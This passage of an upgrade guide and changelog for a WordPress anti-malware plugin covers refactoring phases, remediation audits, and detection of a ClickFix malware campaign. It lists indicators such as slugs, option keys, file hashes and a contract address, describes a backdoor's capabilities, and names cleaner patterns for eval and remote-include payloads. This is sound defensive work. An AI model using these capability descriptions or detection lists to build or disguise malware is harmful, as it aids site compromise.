| Phase 2  Controller and service split | Closed in 1.3.29. Bootstrap shrank from 1083 to 85 lines; 23 AJAX handlers moved to a controller class; helpers moved to `WPS_Utils`. |
| Phase 3  Admin view split | Closed in 1.3.30. The 2115-line `class-admin.php` split into a slim orchestrator plus seven tab classes. Phase 2 regression on `WPS_Admin::register_hooks()` fixed in the same release. |
| Phase 4  Indicator data split | Closed in 1.3.31 with conservative scope. Duplicate option-key, exfil-filename, and cron-hook substring lists extracted to `WPS_Indicators`. Hash and regex catalogues remain owned by the scanner pending a parity test harness. |
| Phase 5  Diagnostics, export, and test harness | Closed in 1.3.31 except for the optional automated WordPress test harness (gated on a separate dev-environment task). Diagnostics export, smoke-test checklist, and pre-release verification script all shipped. |

The next release (1.3.32+) is open to bug fixes, new ClickFix indicator additions, and follow-up items from the second-pass code review (regex backtracking bounds on attacker-controlled cleaner content, explicit symlink guards, info-disclosure path redaction in error messages, and `esc_like` hygiene on forensics SQL).

## From 1.3.29 to 1.3.30+

Version 1.3.30 implements Phase 3 admin view split from the controlled development roadmap. Behavior visible to the operator is unchanged: every tab still renders the same markup, every button keeps its ID, JSON action, payload format, and status target span, and every event log type is unchanged. The admin JavaScript was not touched.

This release also fixes a Phase 2 regression: `WPS_Admin::register_hooks()` was defined but never called from the bootstrap, so on installs that started fresh after 1.3.29 the admin menu, asset enqueueing, and the settings save handler would not register. 1.3.30 wires the call back into the bootstrap.

What changed structurally:

1. The previous 2115-line `includes/class-admin.php` was split into one orchestrator and seven tab classes:
   - `class-admin.php` (283 lines)  shared context builder, header markup, tab nav, dispatch switch.
   - `class-admin-overview.php` (147 lines)  Overview tab.
   - `class-admin-diagnostics.php` (803 lines)  Diagnostics tab. Owns `build_analytics`, `build_source_trace`, `source_trace_*`, `render_source_trace`, `render_analytics_table`, `render_blocked_ips_table`.
   - `class-admin-forensics.php` (370 lines)  Forensics tab. Owns `render_forensics`, `forensic_card`, `forensic_action_button`.
   - `class-admin-remediation.php` (98 lines)  Remediation tab.
   - `class-admin-hardening.php` (272 lines)  Hardening tab. The previous inline closures `$badge` and `$applyBtn` became private static methods `badge()` and `apply_btn()`.
   - `class-admin-events.php` (68 lines)  Events tab.
   - `class-admin-settings.php` (96 lines)  Settings tab.

2. `WPS_Admin::render_page()` now builds a single `$context` array (settings, events, last scan, findings, behavior toggles, blocked IPs, system checks, event labels, tabs, active tab) and calls the right tab class's `render( $context )` method. The wrapping `.wrap` markup, the version badge, the issue-count pill, the saved-settings notice, and the tab nav are unchanged.

3. The bootstrap `wp-perf-shield.php` now requires the seven new tab classes alongside the existing class files and explicitly calls `WPS_Admin::register_hooks()` and `WPS_Remediation_Controller::register_hooks()` at load time.

After upgrading:

1. Open **Tools -> WP Perf Shield** and confirm every tab still renders. Tab order must read Overview, Diagnostics, Forensics, Remediation, Hardening, Events, Settings.
2. Open **Hardening** and confirm the badge text ("Applied" / "Not applied"), the Apply/Remove buttons, and the per-action status spans render and respond exactly as in 1.3.29.
3. If you bookmarked any of the legacy tab URLs (`tab=dashboard`, `tab=analytics`, `tab=log`), confirm they still resolve to Overview, Diagnostics, and Events respectively.
4. Run **Forensics** once, run an **Overview** scan, then check **Diagnostics -> Source Trace** to confirm the cached forensics report drives the timeline as before.

Acceptance criteria for Phase 3:

1. Every tab renders without PHP warnings. The static parser balances all 17 PHP files (10 pre-existing + 7 new tab classes).
2. All existing buttons still work. Action names, button IDs, and JSON config keys are unchanged.
3. Mobile and desktop layouts do not overflow. Inline styles, table widths, and `word-break:break-all` rules carried over byte-for-byte from the pre-split markup.
4. CSS/JS asset files remain present and enqueued only on the WP Perf Shield admin screen via `WPS_Admin::enqueue_assets()`. The hook-suffix gate (`tools_page_wp-perf-shield`) is unchanged.

### Phase 3 file map

| File | Phase 3 role | Lines |
|---|---|---|
| `includes/class-admin.php` | orchestrator: shared context, header + tab nav, dispatch switch, hook registration | 283 |
| `includes/class-admin-overview.php` | Overview tab body | 147 |
| `includes/class-admin-diagnostics.php` | Diagnostics tab body + analytics/Source-Trace helpers | 803 |
| `includes/class-admin-forensics.php` | Forensics tab body + render_forensics + forensic_card + forensic_action_button | 370 |
| `includes/class-admin-remediation.php` | Remediation tab body | 98 |
| `includes/class-admin-hardening.php` | Hardening tab body + `badge()` + `apply_btn()` | 272 |
| `includes/class-admin-events.php` | Events tab body | 68 |
| `includes/class-admin-settings.php` | Settings tab body | 96 |

## From 1.3.28 to 1.3.29+

Version 1.3.29 implements Phase 2 controller and service split from the controlled development roadmap. Behavior is unchanged: no action name, button ID, log type, capability, stored option, or transient changed in this release. The admin JavaScript was not modified. The release exists to move 1000+ lines of inline AJAX closures out of the bootstrap file before later phases (admin view split, indicator data split) start touching adjacent code.

What changed structurally:

1. `wp-perf-shield.php` shrank from 1083 lines to 85 lines. It now carries only the plugin header, constants, `require_once` statements, the activation/deactivation/uninstall hooks, the cron scheduling, and a single call to `WPS_Remediation_Controller::register_hooks()`.
2. New file `includes/class-wps-utils.php` defines a `WPS_Utils` class with six static methods: `path_is_inside`, `guard_request`, `guard_path`, `path_is_self`, `fetch_remote_file`, and `is_clean_wp_cron`. These replace the global `wps_*` helper functions introduced in Phase 1; the logic inside each method is unchanged.
3. New file `includes/class-remediation-controller.php` defines `WPS_Remediation_Controller` with all 23 `wp_ajax_wps_*` handlers as static methods. The class's `register_hooks()` static method maps each action name to the corresponding method and is called once from the bootstrap file at load time.
4. The two cleaner regexes inside `clean_login()` and `clean_functions()` were rewritten from "single-quoted with literal newlines spread across source lines" to "double-quoted with `\n` escape sequences." Both forms compile to identical PCRE patterns, but the new form is robust to autoformatters and trailing-whitespace edits.

After upgrading:

1. Open **Tools -> WP Perf Shield** and confirm every tab still renders.
2. Open **Remediation** and run a no-op cleanup (for example, **Delete malicious DB options** on a clean site, or **Clean wp-config.php** when no removable patterns exist). Verify the action returns successfully and the events log records the same event types as before.
3. Run a forced scan from **Overview** and confirm cached scan results render the same way.

Acceptance criteria for Phase 2:

1. `wp-perf-shield.php` no longer contains large inline AJAX remediation closures. The post-extract count of inline `add_action( 'wp_ajax_wps_*', ... )` registrations in the bootstrap file is zero.
2. Every existing AJAX action name still responds. All 23 expected `wp_ajax_wps_*` actions are registered through `WPS_Remediation_Controller::register_hooks()`.
3. No button IDs or localized JS config names change. `assets/js/admin.js` and `WPS_Admin::enqueue_assets()` were not touched.
4. PHP syntax/parser checks pass on all 10 PHP files.
5. Existing logs and cached scan data remain readable. Log file format, log type names, transient name `wps_scan_results`, option names `wps_settings` / `wps_wpconfig_hash` / `wps_forensics_report` / `wps_blocked_ips`, and the `wps_hourly_scan` cron event are unchanged.

### Phase 2 file map

| File | Phase 2 role |
|---|---|
| `wp-perf-shield.php` | bootstrap only: header, constants, requires, register_*_hook, cron scheduling, controller registration |
| `includes/class-wps-utils.php` | `WPS_Utils` static helpers (path containment, request guard, remote fetch, wp-cron sanity) |
| `includes/class-remediation-controller.php` | `WPS_Remediation_Controller` carrying all 23 `wp_ajax_wps_*` handlers as static methods |
| `includes/class-logger.php` | unchanged in Phase 2 |
| `includes/class-blocker.php` | unchanged in Phase 2 |
| `includes/class-scanner.php` | unchanged in Phase 2 |
| `includes/class-forensics.php` | unchanged in Phase 2 |
| `includes/class-hardening.php` | unchanged in Phase 2 |
| `includes/class-admin.php` | unchanged in Phase 2; Phase 3 will split this file |

## From 1.3.27 to 1.3.28+

Version 1.3.28 implements Phase 1 safety stabilization from the controlled development roadmap. Phase 0 baseline checks were re-run before the work and all eight PHP files plus `assets/js/admin.js` passed structural parser checks. No behavior visible to a non-administrator changes; the user-facing Remediation, Hardening, and Settings tabs continue to expose the same buttons and action names.

Behavioral changes administrators should know about:

1. The destructive AJAX surface now requires a more specific WordPress capability than `manage_options`, with `manage_options` retained as a fallback so older installs and custom administrator-equivalent roles do not lose access. On a default WordPress administrator role on either single-site or multisite super_admin, every destructive action keeps working unchanged.
2. The "Delete exfil file" action no longer returns harvested credential lines in its AJAX response or admin UI. The line count is still logged to the events log so incident response can confirm how much data was captured before deletion. Read the deleted file from the offline backup if you need the actual lines.
3. `wp-config.php` hardening writes (constants, salt rotation, malware cleanup) now create timestamped backups when a `.wps.bak` already exists, so a second action cannot overwrite the first action's recovery point. Look for files named `wp-config.php.wps-YYYYMMDD-HHMMSS.bak` next to the original.
4. Auto-remediation event log entries split into five outcome labels: `auto_deleted`, `auto_delete_failed`, `auto_delete_already_gone`, `auto_delete_parent_handled`, and `auto_delete_skipped_disabled`. Existing log filters that match only the old `auto_deleted` label should be widened.

After upgrading:

1. Open **Tools -> WP Perf Shield -> Settings** and confirm **Clear hostile IP blocks** still works.
2. Open **Remediation** and confirm every action button still completes when clicked. The action names, button IDs, and JS configuration keys are unchanged.
3. Run a forced scan from **Overview**. If auto-delete is enabled and the test environment contains confirmed malware artifacts, confirm that the Events log records `auto_deleted` rows with `result=deleted` in the subject. If detect-only mode is on, confirm the log records `auto_delete_skipped_disabled` rows.

Acceptance criteria for Phase 1:

1. Confirmed malware auto-delete still works when enabled.
2. Detect-only mode still marks auto-delete as skipped and now records a distinct `auto_delete_skipped_disabled` event per affected finding.
3. Legitimate WP Perf Shield release ZIP uploads are not blocked.
4. Known malware ZIPs and renamed ZIPs are still blocked.
5. Hostile-IP clearing remains available from Settings.
6. All destructive AJAX handlers keep nonce checks, keep capability checks, and now route the nonce + capability check through the shared `wps_guard_request()` helper.

### Phase 1 destructive-AJAX audit table

This table documents the allowed target boundary, required capability, and self-protection state for every destructive AJAX handler currently registered in `wp-perf-shield.php`. Read-only handlers are listed for completeness so future audits can confirm no destructive handler was missed.

| Action name | Required capability | Manage-options fallback | Target boundary | Self-protection |
|---|---|---|---|---|
| `wps_run_scan` | `manage_options` | n/a | read-only scan | n/a |
| `wps_clear_log` | `manage_options` | n/a | event log only | n/a |
| `wps_clear_ip_blocks` | `manage_options` | n/a | hostile IP option only | n/a |
| `wps_rebaseline_wpconfig` | `update_core` | yes | wp-config.php hash option only | n/a |
| `wps_clean_wpconfig` | `update_core` | yes | wp-config.php (in-place edit) | wp-config sanity check before and after edit, versioned backup |
| `wps_run_forensics` | `manage_options` | n/a | read-only report | n/a |
| `wps_delete_exfil` | `delete_posts` | yes | uploads basedir only | path containment via `wps_guard_path()`, symlinks refused, credential body never returned to browser |
| `wps_clean_login` | `update_core` | yes | wp-login.php only | atomic temp + rename, downloaded replacement validated |
| `wps_clean_functions` | `edit_themes` | yes | active theme functions.php only | atomic temp + rename |
| `wps_clean_cron` | `update_core` | yes | wp-cron.php only | size + required-string + deny-list validation, backup, atomic write |
| `wps_delete_db_options` | `manage_options` | n/a | hardcoded malware option allowlist + suspicious cron hooks | option allowlist, cron name pattern allowlist |
| `wps_hardening_status` | `manage_options` | n/a | read-only status | n/a |
| `wps_wpconfig_constant` | `update_core` | yes | wp-config.php (constant in `ALLOWED_CONSTANTS`) | constant allowlist, wp-config sanity check before and after edit, versioned backup |
| `wps_htaccess_rule` | `manage_options` | n/a | .htaccess marker block in `HTACCESS_RULES` | rule allowlist, post-write verification |
| `wps_clear_transients` | `manage_options` | n/a | transient rows in options table | option-name pattern only |
| `wps_invalidate_sessions` | `manage_options` | n/a | usermeta `session_tokens` rows only | exact meta_key match only |
| `wps_regenerate_salts` | `update_core` | yes | wp-config.php (eight salt define lines) | wp-config sanity check before and after edit, refuses to write if no salt define line matched, versioned backup |
| `wps_delete_user` | `delete_users` | yes | single WP user by id | self-deletion blocked, content reassigned to current admin |
| `wps_delete_attachment` | `delete_posts` | yes | single WP attachment by id | post type must be `attachment` |
| `wps_delete_plugin_folder` | `delete_plugins` | yes | inside `WP_CONTENT_DIR` | refuses to delete `WP_CONTENT_DIR` itself, refuses to delete `WPS_DIR`, deactivates plugin first |
| `wps_delete_single_option` | `manage_options` | n/a | hardcoded malware option allowlist | option allowlist, deletion verified before logging |
| `wps_delete_file` | `manage_options` | n/a | inside `ABSPATH` | core file allowlist (`wp-config.php`, `wp-load.php`, `wp-settings.php`, `wp-blog-header.php`, root `index.php`) refused outside `wp-content` |
| `wps_delete_theme_file` | `edit_themes` | yes | inside parent or child theme directory | refuses to delete `functions.php` (use `wps_clean_functions` instead) |

The shared guard helpers used by the table:

```text
wps_guard_request( $cap, $allow_admin = true )  nonce + capability check, dies on failure
wps_guard_path( $candidate, $base )             realpath + containment, false on escape
wps_path_is_self( $real )                       true when path is WPS_DIR or inside it
wps_path_is_inside( $child, $parent )           shared containment helper used elsewhere
```

## From 1.3.26 to 1.3.27+

Version 1.3.27 adds a Source Trace diagnostic panel to **Diagnostics**.

The Source Trace view groups evidence that was previously spread across several places:

1. Blocked upload and blocked upload-pathway events from the retained security log.
2. Active hostile IP block records, including attempts, last filename, pathway, user, and last seen time.
3. Current cached scan findings.
4. Cached Forensics data for media ZIP records, suspicious plugin file mtimes, database persistence options, executable PHP checks, and core integrity mismatches.
5. Trace-focused Apache/nginx grep commands generated from current timeline indicators, filenames, option keys, and hostile IPs.

Use the panel as the first triage view when malware appears to be returning. Start with the newest attack signal, compare it with the nearest file mtime or database persistence row, then run the generated SSH grep commands against server access logs to identify the route that accepted the request.

Important timestamp note:

1. WordPress stores media upload timestamps and filesystem mtimes.
2. WordPress security events include the event time from WP Perf Shield.
3. `wp_options` does not include a native `created_at` timestamp.
4. Database persistence rows are therefore shown at Forensics report time unless a scan, delete action, or event log row caught the option earlier.

After upgrading:

1. Run **Forensics** once to populate the cached report used by Source Trace.
2. Open **Diagnostics** and review **Source Trace**.
3. If hostile IPs or suspicious mtimes are present, expand **SSH grep commands for this trace** and run the Apache/nginx commands on the server.
4. Clean any remaining artifacts from **Forensics** or **Remediation**, then rerun **Overview** scan and **Forensics** to verify that the timeline no longer shows active persistence.
5. If a deleted database option reappears after cleanup, assume a live backdoor or scheduled task is recreating it and focus on the nearest file mtime, MU plugin, cache/language PHP file, cron hook, and upload route.

Acceptance criteria:

1. Diagnostics renders Source Trace without triggering scans or heavy filesystem work on page load.
2. Source Trace shows useful entries even when only the event log and active hostile IP list are available.
3. Running Forensics enriches the timeline with media records, mtimes, database persistence rows, PHP executable findings, core integrity findings, and SSH commands.
4. Generated commands never include secrets and are displayed for operator execution only.
5. All PHP files and admin JavaScript pass syntax checks.
6. The release ZIP keeps `wp-perf-shield/` as the single root folder.

## From 1.3.25 to 1.3.26+

Version 1.3.26 adds coverage for two newly analyzed suspicious archives:

1. `site-speed-insights-d6e7.zip`
2. `languages.zip`

`site-speed-insights-d6e7.zip` is confirmed as another ClickFix render-hijacker malware plugin. It uses the plugin name `Site Speed Insights`, a random-suffix folder, the class `Health_Manager_5fec`, and the option key `wp_204acd2d43_cfg`. Its decoded payload follows the same campaign pattern as the earlier render-hijackers: Polygon RPC endpoints, the confirmed contract `0x08207B087F61d7e95E441E15fd6d40BEfd6eD308`, `eth_call`, dismissal cookies, and visitor-facing ClickFix delivery.

`languages.zip` is not a normal WordPress language pack. It contains `languages/wp-locale-handler.php`, a disguised second-stage PHP RAT/backdoor. The file exposes the known `_wph` access key, arbitrary PHP execution mode, MU-plugin restore mode from `wp_session_tokens_config`, login/theme credential-harvester injection modes, hidden-admin creation, self-update, and auth/session bypass logic.

`2026.zip` was reviewed as an uploads/media archive. Static inspection found image entries only and no PHP files or confirmed executable malware indicators. It should not be added to the malware blocklist solely because it contains ordinary media paths.

New built-in indicators include:

1. Plugin family: `site-speed-insights`.
2. Handler class: `Health_Manager_5fec`.
3. Database option: `wp_204acd2d43_cfg`.
4. RAT filename: `wp-locale-handler.php`.
5. MD5 hashes: `6f6b4854cb0d71f81796ead56132c89a` and `d2c9540df466434c7658d7956c5c833d`.
6. SHA-256 hashes: `9b5cc2de2e2cd968c5f69a0a6d561b37d31424f3f8c814d11a7404cc4a5bcaa8` and `6c862aabe3680ec9f4b03fbad7313f1a57b1c9d7a6f199f2ab503b28319cafab`.

Detection and removal changes:

1. ZIP uploads are blocked when they contain `site-speed-insights` folder patterns, the `languages/wp-locale-handler.php` entry, the confirmed hashes, or high-confidence RAT/ClickFix markers.
2. The scanner now checks `wp-content/languages` for confirmed PHP backdoors and auto-removes `wp-locale-handler.php` or language-directory PHP files that match known RAT signatures.
3. Legitimate WordPress `.l10n.php` translation files are allowed and should not be flagged.
4. Malicious database option cleanup now includes `wp_204acd2d43_cfg`.
5. Forensics trace terms and SSH grep commands now include `site-speed-insights`, `wp-locale-handler`, and `wp_204acd2d43_cfg`.
6. `.htaccess` hardening for ClickFix plugin folders now includes `site-speed-insights[-_]suffix` folders.

After upgrading:

1. Run a forced scan from **Overview**.
2. Open **Remediation** and run **Delete malicious DB options** if `wp_204acd2d43_cfg` or any other campaign option remains.
3. Open **Hardening** and re-apply **Block ClickFix plugin folder patterns** if it shows as not applied, so the `.htaccess` marker block includes `site-speed-insights`.
4. Open **Forensics** and check the PHP-executable and known-backdoor sections for `wp-content/languages/wp-locale-handler.php`.
5. Review **Events** for blocked upload entries involving `site-speed-insights-d6e7.zip`, `languages.zip`, or renamed ZIPs with those contents.

## From 1.3.24 to 1.3.25+

Version 1.3.25 fixes an administrator-account false positive.

The earlier forensics heuristic incorrectly treated `bismikaallahuma` as a known attacker username. That is a legitimate long-standing site administrator on this installation, so the rule was too broad and misleading.

The plugin now limits confirmed malware-created account matching to the known persistence-style account `adminbackup561801`, and the admin table wording distinguishes confirmed malware-created accounts from ordinary suspicious signals such as recently created or generic usernames.

The cached forensics report is cleared automatically on version change. After upgrading, re-open or rerun **Forensics** and the legitimate admin account should show as `ok` unless another independent suspicious signal exists.

## From 1.3.23 to 1.3.24+

Version 1.3.24 fixes hardening actions that appeared to do nothing after confirmation.

The Auth salt rotation section had a duplicate `wps-h-salts-msg` element ID. JavaScript wrote the success message into the hidden duplicate, so the action could complete while the UI showed no visible result.

Hardening confirmations are now action-specific, and one-way session or salt actions hide their button after success so the completion badge is visible.

No security behavior changes are required after upgrading.

## From 1.3.22 to 1.3.23+

Version 1.3.23 improves the Overview findings layout.

The old scan findings table could render poorly when several critical findings had long subjects, long signature strings, and auto-delete status rows. Findings now render as compact incident cards with severity badges, signature chips, wrapped subjects, and the remediation state inside the same card.

No security behavior changes are required after upgrading.

## From 1.3.21 to 1.3.22+

Version 1.3.22 fixes `.htaccess` hardening Remove actions.

Earlier builds could show a misleading state after clicking **Remove**. The AJAX response said `Removed`, but WordPress marker handling could leave an empty `# BEGIN` / `# END` marker block in `.htaccess`, and the UI still treated that marker as `Applied`.

The removal path now deletes the whole marker block, verifies the rule is no longer current, and reloads the Hardening tab so the status badge is based on the real `.htaccess` contents.

After upgrading, click **Remove** again for any `.htaccess` rule you want disabled. If the rule still shows as applied, inspect the site-root `.htaccess` file for a manually edited duplicate block.

## From 1.3.20 to 1.3.21+

Version 1.3.21 fixes a self-blocking false positive in the ZIP content guard.

WP Perf Shield stores confirmed malware slugs, option names, class names, and payload markers in its own PHP source so it can detect those indicators on infected sites. Version 1.3.20 correctly inspected ZIP contents, but it could also see those same indicator strings inside a WP Perf Shield release ZIP and reject the plugin's own update package.

The guard now recognizes a valid WP Perf Shield release ZIP only when:

1. Every normal ZIP entry is under `wp-perf-shield/`.
2. The package contains `wp-perf-shield/wp-perf-shield.php`.
3. The main plugin file contains the `Plugin Name: WP Perf Shield` header and `WPS_VERSION` definition.

For that narrow self-package case, the scanner ignores indicator strings in the known WP Perf Shield PHP files that are expected to contain detection data. Unknown extra PHP files inside the same ZIP are still inspected.

If your own IP was auto-blocked while uploading a WP Perf Shield release ZIP, clear the hostile IP list once via **Settings -> Clear hostile IP blocks**, WP-CLI, or the database before uploading this fixed release.

## From 1.3.19 to 1.3.20+

Version 1.3.20 adds confirmed indicators for two more ClickFix render-hijacker malware samples:

1. `total-render-toolkit-adae.zip`
2. `pro-font-optimizer-c88b.zip`

Both samples follow the same disguise pattern as the earlier render-hijacker payloads: a fake performance or optimization plugin, a random suffix in the folder name, a single PHP loader, administrator and bot evasion, visitor-facing `wp_footer` script injection, Polygon RPC markers, and campaign database options.

New built-in indicators include:

1. Plugin families: `total-render-toolkit` and `pro-font-optimizer`.
2. Database options: `wp_0b05838858_cfg` and `wp_e3ef2393dd_cfg`.
3. Handler classes: `Res_Loader_25bb` and `Asset_Module_9475`.
4. MD5 hashes: `0e34f31fac8662886303225484dd648a` and `99c53e189239269f0197802306af236a`.
5. SHA-256 hashes: `c22bbb5144d71de9ece4c8cf52db0e9f79b70f7e77f0064fa9e06753b340f541` and `751b9848b645f5e7ab72eab015ea6743284657cfdcfc844a9c06081400ded3b6`.

After upgrading:

1. Run a forced scan from **Overview**.
2. Open **Remediation** and run **Delete malicious DB options** if any option findings remain.
3. Open **Hardening** and re-apply **Block ClickFix plugin folder patterns** if it shows as not applied, so the `.htaccess` marker block includes the new folder patterns.
4. Open **Diagnostics** and **Forensics** to review whether any upload attempts used these new names or option keys.

## From 1.3.18 to 1.3.19+

Version 1.3.19 adds inner-ZIP malware inspection during WordPress uploads. This closes the obvious evasion path where an attacker renames `native-render-toolkit-9401.zip` or `total-render-profiler-3753.zip` to a harmless-looking filename before uploading it.

The upload blocker now checks ZIP contents for:

1. Known malware plugin folder names and suffix patterns.
2. Built-in and custom MD5/SHA-256 hashes for PHP files inside the ZIP.
3. Confirmed ClickFix render-hijacker markers such as campaign option keys, handler names, Polygon RPC markers, and the confirmed contract address.

Uploads that match are logged as `upload_blocked`, auto-block the source IP when that setting is enabled, and include the matched entry, hash, or signature in the event subject.

## From 1.3.17 to 1.3.18+

Version 1.3.18 fixes the Forensics inline action buttons that pass string payloads such as database option names and filesystem paths. The affected buttons could render correctly but fail to run because the inline JSON payload was not safely escaped inside the HTML attribute.

After upgrading, use **Forensics -> Delete now** for `wp_94d4678186_cfg` and `wp_a26c00cc40_cfg`, or use **Remediation -> Delete malicious DB options** to remove all known malicious options at once. The cached Forensics report is now cleared after option cleanup, so stale database-anomaly rows do not survive the next refresh.

## From 1.3.16 to 1.3.17+

Version 1.3.17 adds confirmed indicators for two new ClickFix render-hijacker malware samples:

1. `native-render-toolkit-9401.zip`
2. `total-render-profiler-3753.zip`

Both samples install a fake plugin, hide from administrators, editors, authors, bots, mobile/tablet clients, AJAX, cron, and REST contexts, then inject visitor-facing JavaScript through `wp_footer`. The payload family uses Polygon RPC endpoints, the `0x08207B087F61d7e95E441E15fd6d40BEfd6eD308` contract, and verification/dismiss cookies such as `_cf_verified` and `_wp_perf_ok`.

After upgrading:

1. Run a forced scan from **Overview**.
2. Open **Remediation** and run **Delete malicious DB options** if any option findings remain.
3. Open **Hardening** and re-apply **Block ClickFix plugin folder patterns** if it shows as not applied. Existing old `.htaccess` marker blocks may need this refresh to include the new folder patterns.
4. Open **Forensics** and use the Apache/nginx source-tracing commands if you need to identify the upload route or source IP from server logs.

## From 1.3.15 to 1.3.16+

Version 1.3.16 is an admin UI polish release for the Hardening tab. Successful Apply actions now collapse into compact status badges instead of leaving the original button beside a long inline success message.

No behavior or security policy changes are required after upgrading.

## From 1.3.14 to 1.3.15+

Version 1.3.15 adds targeted `wp-config.php` malware cleanup.

The scanner now checks `wp-config.php` for known removable patterns:

1. Encoded `eval()` / `assert()` payload lines.
2. Suspicious `include` / `require` lines pointing to remote URLs, uploads, cache, tmp, or known malware paths.
3. `wp_session_tokens_config` / `session_tokens_config` option-loader restorers.
4. ClickFix and wp-perf-analytics marker lines.
5. Known malware marker comment blocks.

Use **Remediation -> Clean wp-config.php** only after reviewing the finding. The cleaner creates `wp-config.php.wps-clean.bak` before writing, uses timestamped backup names when needed, refuses to write if the cleaned file fails sanity checks, logs what was removed, and stores a new clean baseline after successful cleanup.

The cleaner is intentionally narrow. A plain hash mismatch without a known removable pattern still requires manual review or a deliberate baseline reset.

## From 1.3.13 to 1.3.14+

Version 1.3.14 reorganizes the admin tabs around the incident-response workflow:

1. **Overview** for scan status, readiness checks, findings, and recent events.
2. **Diagnostics** for attack counts, hostile IPs, clearances, scan outcomes, and active IP blocks.
3. **Forensics** for trace reports and SSH follow-up commands.
4. **Remediation** for cleanup actions.
5. **Hardening** for protective controls.
6. **Events** for the full retained security log.
7. **Settings** for custom indicators and behavior toggles.

Old tab URLs remain supported:

1. `tab=dashboard` maps to `tab=overview`.
2. `tab=analytics` maps to `tab=diagnostics`.
3. `tab=log` maps to `tab=events`.

Settings no longer shows the active hostile IP block table. Review those operational details in **Diagnostics** instead.

## From 1.3.12 to 1.3.13+

Version 1.3.13 adds upload-pathway tracing and a strict ZIP upload guard.

For each blocked malware upload, the event log now records:

1. Request route / URI.
2. HTTP method.
3. WordPress AJAX action, when present.
4. REST route, when present.
5. Referrer.
6. WordPress user, role, and upload/install/manage capabilities.

This helps distinguish between:

1. An unauthenticated vulnerable upload endpoint.
2. A logged-in non-admin upload route.
3. A stolen admin session.
4. An unusual plugin or file-manager endpoint calling WordPress upload APIs.

The new **Restrict ZIP uploads to trusted admin routes** setting is enabled by default. It blocks ZIP uploads unless they come from an administrator using normal WordPress upload screens such as plugin install, media upload, or async upload.

If your site intentionally accepts ZIP uploads through a custom plugin, review the Diagnostics and Events tabs first, then disable this setting only if the custom route is confirmed legitimate.

## From 1.3.11 to 1.3.12+

Version 1.3.12 adds an **Analytics** tab. It does not create a new tracking table; the dashboard is computed from the newest retained event-log entries plus the active hostile-IP block list.

Use it to monitor:

1. Attack attempts and blocked malware uploads.
2. Active hostile IP blocks and blocked-IP attempt totals.
3. Clearance actions such as auto-deletes, file cleanups, database option removals, salt rotation, and session invalidation.
4. Clean scans versus issue scans.
5. Daily activity, top attacking IPs, top attack subjects, and event mix.
6. Diagnostics for auto-delete, hostile IP blocking, log writability, cached findings, and log retention usage.

The event log keeps the newest 200 events, so move longer-term reporting to a server/WAF log export if you need historical trend data beyond that retention window.

## From 1.3.10 to 1.3.11+

Version 1.3.11 adds hostile IP auto-blocking based on the repeated `wp-perf-analytics.zip` upload attempts seen in the event log.

Existing installs default to enabled behavior:

1. If an IP attempts to upload a known malware filename, the upload is blocked as before.
2. The source IP is added to a 7-day WordPress-level block list.
3. Future WordPress requests from that IP receive a 403 response.
4. The event log records `ip_auto_blocked`, `ip_block_refreshed`, and rate-limited `ip_request_blocked` entries.

To review or change this:

1. Open **Tools > WP Perf Shield > Settings**.
2. Review **Active hostile IP blocks**.
3. Keep **Auto-block IPs that attempt known malware uploads** enabled during active incident response.
4. Use **Clear hostile IP blocks** only after moving those IPs into a hosting/WAF firewall or correcting a false positive.

## From 1.3.9 to 1.3.10+

Version 1.3.10 fixes `wp-cron.php` forensics verification for current WordPress versions. The Forensics tab now checks the installed WordPress version against the official WordPress checksum API instead of relying only on a short local MD5 list. The plugin also clears stale cached forensics once after the version changes, so an old `unverified` result does not survive the upgrade.

After upgrading:

1. Open **Tools > WP Perf Shield > Forensics**.
2. Re-run or refresh the forensics report.
3. Confirm `wp-cron.php integrity` shows `verified_clean` when the file MD5 matches the expected official checksum.
4. If it still shows `unverified`, compare the displayed **MD5** and **Expected MD5** rows and replace `wp-cron.php` again from the Remediation tab if they differ.

## Three-Phase Architecture Plan

### Phase 1: Controlled Auto-Remediation

- Add an `auto_delete_enabled` setting, defaulting to on.
- Expose the setting in the Settings tab as "Auto-delete confirmed malware artifacts."
- Keep auto-delete limited to scanner findings explicitly marked as safe for automatic deletion.
- Show auto-delete completion or skipped status in Dashboard scan results.
- Enrich auto-delete log entries with path, finding type, matched signature/hash when available, severity, and action result.

### Phase 2: Controller and Service Split

- Move AJAX remediation handlers out of `wp-perf-shield.php` into a dedicated controller class.
- Move helper functions such as remote file fetch and clean `wp-cron.php` validation into a utility/service class.
- Keep the bootstrap file focused on constants, includes, activation/deactivation hooks, and service registration.

### Phase 3: View and Indicator Data Split

- Split `includes/class-admin.php` into smaller tab renderers or template partials.
- Move malware indicators, hashes, known slugs, and whitelists into versioned data files.
- Add diagnostics/export actions for logs, findings, version data, paths, and support bundles.
- Add a manual smoke-test checklist or automated test scaffold when PHP/WP test tooling is available.

## From 1.3.8 to 1.3.9+

Phase 1 adds a controlled auto-remediation setting. Existing installs default to the previous behavior: confirmed malware artifacts are auto-deleted unless the new setting is disabled.

To review or change the setting:

1. Open **Tools > WP Perf Shield > Settings**.
2. Find **Auto-remediation**.
3. Keep **Auto-delete confirmed malware artifacts** enabled for active incident response, or disable it for detect-only scans.

Dashboard scan results now show whether auto-delete completed or was skipped by setting. Event log entries for auto-deleted files now include the path, finding type, matched signature/hash when available, and severity.

## Standard Upgrade

1. Back up the WordPress database and files.
2. Upload the new `wp-perf-shield` folder over the existing plugin folder.
3. Confirm the plugin remains active from the WordPress Plugins screen.
4. Open **Tools > WP Perf Shield**.
5. Run a manual scan from the Overview tab.
6. Review the Events tab for migration or scan events.

## From 1.3.4 to 1.3.5+

The structured event log moved into the plugin folder:

```text
wp-content/plugins/wp-perf-shield/logs/events.php
```

On first run, the logger copies the previous log from:

```text
wp-content/wps-security/events.php
```

The old file is treated as a migration source only. New events are written to the plugin-local `logs/events.php` file.

## File Permissions

Make sure WordPress can write to:

```text
wp-content/plugins/wp-perf-shield/logs/
```

The directory includes `index.php` and `.htaccess` protection files, and the event log itself starts with a PHP guard.

## Release Package Check

The ZIP archive must have this root folder:

```text
wp-perf-shield/
```

Do not package the files directly at the ZIP root.
